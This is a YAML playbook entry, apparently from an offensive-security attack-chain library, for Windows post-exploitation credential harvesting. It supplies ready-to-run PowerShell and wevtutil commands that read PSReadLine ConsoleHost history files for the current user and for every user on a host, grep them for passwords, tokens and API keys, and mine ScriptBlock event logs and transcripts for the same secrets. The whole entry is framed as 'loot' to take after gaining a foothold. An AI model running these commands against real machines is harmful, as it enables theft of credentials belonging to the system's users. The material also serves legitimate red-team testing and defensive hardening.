chain_id: powershell_history_harvest
title: "Windows post — PowerShell ConsoleHost history → embedded credentials"
severity: MEDIUM
tags: [windows, post-exploit, powershell, history, credential-harvest]

trigger:
  any_of:
    - { kind: "windows_local_user_shell" }

description: |
  PSReadline (default since PowerShell 5.1) writes every command the
  user typed to `%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\
  ConsoleHost_history.txt` — including the ones with `-Password
  '<plain>'`, `Connect-AzAccount … -ApplicationId … -CertificateThumbprint`,
  `Invoke-Sqlcmd -Username sa -Password …`, etc. Dumb, default-on,
  keeps history forever (no rotation). Day-1 post-foothold loot.

steps:
  - id: 1
    title: "Read the current user's history"
    command: |
      type "%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"

  - id: 2
    title: "Grep for high-value patterns"
    command: |
      Select-String -Path "$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" \
        -Pattern '(?i)(password|pwd|secret|token|apikey|connectionstring|clientsecret)'

  - id: 3
    title: "Loot every user on the box (admin shell)"
    command: |
      Get-ChildItem 'C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt' -Force | \
        ForEach-Object {
          Write-Host "=== $($_.FullName) ==="
          Get-Content $_.FullName | Select-String -Pattern '(?i)(password|secret|token|apikey)'
        }

  - id: 4
    title: "Same idea for cmd.exe — DOSKey doesn't persist, skip"
    command: |
      # cmd.exe history is in-memory only. Nothing to harvest there.

  - id: 5
    title: "Bonus — cleared history might still survive in Event Log"
    command: |
      # If ScriptBlock logging is enabled (Event ID 4104):
      wevtutil qe Microsoft-Windows-PowerShell/Operational /q:"*[System[EventID=4104]]" /f:text | \
        findstr /R /C:"password" /C:"secret"

common_errors:
  - error: "history file is empty / 0 bytes"
    solution: |
      User clears it (`Remove-Item ConsoleHost_history.txt`) or
      PSReadline is disabled. Check transcripts at
      `Documents\\PowerShell_transcripts\\` and event-log
      ScriptBlock 4104 — both leak the same data.
